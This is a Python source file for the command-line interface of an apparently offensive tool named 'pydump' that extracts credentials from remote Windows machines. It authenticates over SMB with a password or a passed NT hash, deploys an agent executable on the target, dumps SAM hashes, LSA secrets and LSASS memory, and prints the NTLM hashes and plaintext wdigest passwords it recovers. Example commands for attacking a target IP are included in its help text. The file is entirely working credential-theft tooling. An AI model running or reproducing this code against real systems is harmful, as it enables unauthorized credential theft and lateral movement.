"""Command-line interface for pydump."""

import argparse
import sys
import os


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote Windows credential extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
  python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam
  python main.py -t 10.0.0.5 -u admin -p pass --lsass -o lsass.dmp
  python main.py --parse lsass.dmp
""",
    )

    # Target / auth
    parser.add_argument("-t", "--target", help="Target IP or hostname")
    parser.add_argument("-u", "--username", help="Username")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
                        metavar="NTHASH", help="NT hash (32 hex chars)")
    parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")

    # What to extract
    parser.add_argument("--sam", action="store_true", help="Extract SAM hashes")
    parser.add_argument("--lsa", action="store_true", help="Extract LSA secrets")
    parser.add_argument("--lsass", action="store_true", help="Dump LSASS memory")

    # Options
    parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
    parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
    parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")
    parser.add_argument("--parse", default=None, metavar="FILE", help="Parse an existing .dmp file offline")

    args = parser.parse_args()

    # Offline parse mode
    if args.parse:
        _cmd_parse(args.parse)
        return

    # Validate required args for remote mode
    if not args.target or not args.username:
        parser.error("-t/--target and -u/--username are required")
    if not args.password and not args.nt_hash:
        parser.error("provide either -p/--password or -H/--hash")
    if args.nt_hash:
        h = args.nt_hash.lower()
        if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
            parser.error("--hash must be exactly 32 hex characters")
        args.nt_hash = h

    # Default: if no flags, do everything
    if not args.sam and not args.lsa and not args.lsass:
        args.sam = args.lsa = args.lsass = True

    _cmd_dump(args)


def _cmd_dump(args):
    from .smb import SmbSession
    from .dump.methods import PipeDump

    do_registry = args.sam or args.lsa
    do_lsass = args.lsass

    agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
    if not os.path.isfile(agent_path):
        print(f"[!] Agent not found: {agent_path}")
        print("    Build it with: cd agent && make cross")
        sys.exit(1)

    print(f"[*] Connecting to {args.target}...")

    try:
        with SmbSession(args.target, args.username, args.password, args.domain,
                        nt_hash=args.nt_hash) as session:
            auth_method = "PTH" if args.nt_hash else "password"
            print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")

            method = PipeDump(session, agent_path)

            lsass_pid = 0
            if do_lsass:
                lsass_pid = args.pid or method.find_lsass_pid()

            scope = []
            if do_registry:
                scope.append("registry")
            if do_lsass:
                scope.append(f"LSASS pid={lsass_pid}")
            print(f"[*] Deploying agent ({', '.join(scope)})")

            result = method.execute(lsass_pid=lsass_pid)

            # SAM
            if args.sam and result.system_hive and result.sam_hive:
                _show_sam(result.system_hive, result.sam_hive)

            # LSA
            if args.lsa and result.system_hive and result.security_hive:
                _show_lsa(result.system_hive, result.security_hive)

            # LSASS
            if args.lsass and result.lsass_dump:
                print(f"\n[+] LSASS dump: {len(result.lsass_dump)} bytes ({len(result.lsass_dump) // 1024 // 1024} MB)")
                if args.output:
                    with open(args.output, "wb") as f:
                        f.write(result.lsass_dump)
                    print(f"[+] Saved to {args.output}")
                _show_lsass(result.lsass_dump)
            elif args.lsass:
                print("\n[-] No LSASS data received")

    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)


def _show_sam(system_hive: bytes, sam_hive: bytes):
    from .secrets.registry import extract_boot_key_from_hive, parse_sam_hive

    print()
    print("── SAM Hashes ───────────────────────────────────────────────")
    try:
        boot_key = extract_boot_key_from_hive(system_hive)
        hashes = parse_sam_hive(sam_hive, boot_key)
        if hashes:
            for h in hashes:
                print(f"  {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
        else:
            print("  (none)")
    except Exception as e:
        print(f"  [!] {e}")


def _show_lsa(system_hive: bytes, security_hive: bytes):
    from .secrets.registry import extract_boot_key_from_hive, parse_security_hive

    print()
    print("── LSA Secrets ──────────────────────────────────────────────")
    try:
        boot_key = extract_boot_key_from_hive(system_hive)
        secrets = parse_security_hive(security_hive, boot_key)
        if secrets:
            for s in secrets:
                print(f"  {s.name}: {s.decoded}")
        else:
            print("  (none)")
    except Exception as e:
        print(f"  [!] {e}")


def _show_lsass(dump_data: bytes):
    from .parser.minidump import parse
    from .parser.extract import CredentialExtractor

    print("[*] Parsing minidump...")
    dump = parse(dump_data)
    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")

    extractor = CredentialExtractor(dump)
    try:
        credentials = extractor.extract()
    except Exception as e:
        print(f"  [!] {e}")
        return

    if not credentials:
        print("  (none)")
        return

    print()
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)
    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash or "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password or "(empty)"
        else:
            secret = ""
        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")


def _cmd_parse(filepath: str):
    if not os.path.isfile(filepath):
        print(f"[!] File not found: {filepath}")
        sys.exit(1)

    with open(filepath, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {filepath} ({len(dump_data)} bytes)")
    _show_lsass(dump_data)
